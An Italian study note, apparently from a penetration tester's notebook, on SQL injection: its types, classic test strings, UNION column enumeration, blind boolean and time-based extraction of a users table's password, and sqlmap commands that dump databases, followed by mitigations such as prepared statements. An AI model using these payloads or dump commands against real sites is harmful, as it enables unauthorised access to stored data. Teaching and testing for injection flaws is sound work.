L'app costruisce query SQL concatenando input dell'utente senza sanitizzazione. Tu "esci" dal contesto del dato e inietti SQL che il DB esegue.

### Perché succede

Concatenazione di stringhe invece di **query parametrizzate (prepared statements)**.


## Tipi
- In-band / UNION-based: i risultati tornano direttamente nella pagina;
- Blind boolean-based: nessun output, ma la pagina cambia in base a vero/falso;
- Blind time-based: nessun cambiamento visibile, ma si può far "dormire" il DB e misurare il tempo di risposta;
- Error-based: il DB rivela dati dentro i messaggi di errore.

## Test classici

```
	' OR '1'='1' -- 
	' OR '1'='1
	admin' -- 
```

## Sfruttamento UNION-based

1. Contare le colonne con ORDER BY finché va in errore:
```
	id=1 ORDER BY 1 -- 
```
2. Trovare le colonne stampate a video:
```
	id=-1 UNION SELECT 1,2,3 -- 
```
3. Estrarre info dal DB:
	1. es:
		1. information_schema: DB di sistema con metadati;
		2. group_concat(): unisce più righe in una stringa sola;
		3. 0x3a=: in esadecimale, usato come separatore per non rompere la query con apici;

## Sfruttamento Blind (boolean)

Estrai dato carattere per carattere osservando se la pagina cambia:
```
	' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
```
- SUBSTRING(str, pos, len) prende un carattere alla volta.
- Cicli su a..z/0...9: quando la pagina risponde correttamente, hai trovato il carattere.

## Sfruttamento Blind (time-based)
```
	' AND IF(1=1, SLEEP(5), 0)--
	' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP (5))) 
```

### Automazione con SQLMap

```
	sqlmap -u "http://URL?id=1" --batch --dbs
	sqlmap -u "http://URL?id=1" -D nomedb --tables
	sqlmap -u "http://URL?id=1" -D nomedb -T users --dump
	sqlmap -r request.txt --batch --dump
	
	-u: URL
	--batch: risponde di default a tutte le domande
	--dbs/--tables/--dump: enumera database/tabelle/estrae i dati
	-r request.txt: usa una richiesta HTTP completa (fondamentale per POST, header, cookie/sessione)
	--level -- risk: più alti=più test
```

### Mitigazione
Prepared statements / query parametrizzate, ORM, validazione input (allowlist), least privilege sull'utente DB, WAF come difesa-inf-profondità (non come unica difesa).

---

Vedi anche: [[Recon & Enumeration]] · [[Authentication & Session Attacks]] · [[Report template]]
